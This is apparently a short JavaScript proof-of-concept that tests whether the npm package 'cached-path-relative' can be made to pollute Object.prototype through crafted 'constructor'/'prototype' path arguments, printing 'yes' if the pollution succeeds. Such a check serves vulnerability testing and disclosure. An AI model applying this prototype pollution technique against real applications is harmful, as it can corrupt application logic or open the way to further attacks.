var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var relative = require('cached-path-relative');
relative('constructor', 'prototype', 'polluted');
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}